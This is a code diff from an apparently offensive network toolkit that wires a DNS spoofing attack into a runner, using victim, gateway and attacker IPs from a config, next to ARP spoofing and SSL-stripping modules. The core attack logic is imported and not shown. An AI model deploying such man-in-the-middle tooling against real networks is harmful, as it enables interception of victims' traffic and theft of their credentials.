@@ -1,5 +1,5 @@
 from src.attacks.arp_spoofing import start_arp_spoof
-from src.attacks.dns_spoofing import start_dns_spoof
+from src.attacks.dns_spoofing import DnsSpoofingAttack
 from src.attacks.ssl_strip import start_sslstrip
 
 from .config import load_config
@@ -21,13 +21,31 @@ def start_arp_mitm(target_ip: str, gateway_ip: str):
     else:
         print(f"[ERROR] Victim {target_ip} is NOT reachable after ARP spoof.")
 
-def start_dns_spoof(domain: str, fake_ip: str):
-    # Placeholder for starting DNS spoofing attack
-    # Import from attacks.dns_spoof
-    print(f"[INFO] Starting DNS spoof for {domain} to {fake_ip}...")
-    
-    # Call the DNS spoofing attack (stubbed function for now)
-    start_dns_spoof(domain, fake_ip)
+def dns_spoof():
+    config = load_config()
+    victim_ip = config['victim']['ip']
+    gateway_ip = config['gateway']['ip']
+    attacker_ip = config['attacker']['ip']
+    domain_name = config['domain']['name']
+
+    print(f"[INFO] Starting DNS spoof for {domain_name} to {attacker_ip}...")
+    attack = DnsSpoofingAttack(
+        domain=domain_name,
+        fake_ip=attacker_ip,
+        target_ip=victim_ip,
+        gateway_ip=gateway_ip
+    )
+    try:
+        attack.start()
+        print("[INFO] DNS spoofing attack started. Press Ctrl+C to stop.")
+        # Keep the main thread alive while the attack runs
+        while True:
+            pass
+    except KeyboardInterrupt:
+        print("\n[INFO] Stopping DNS spoofing attack.")
+    finally:
+        attack.stop()
+        print("[INFO] DNS spoofing attack stopped.")
 
 def start_ssl_strip(target_ip: str):
     # Placeholder for starting SSL stripping attack
@@ -50,7 +68,7 @@ def run(mode: str):
     if mode == "arp":
         start_arp_mitm()
     elif mode == "dns":
-        start_dns_spoof()
+        dns_spoof()
     elif mode == "ssl":
         start_ssl_strip()
     else:
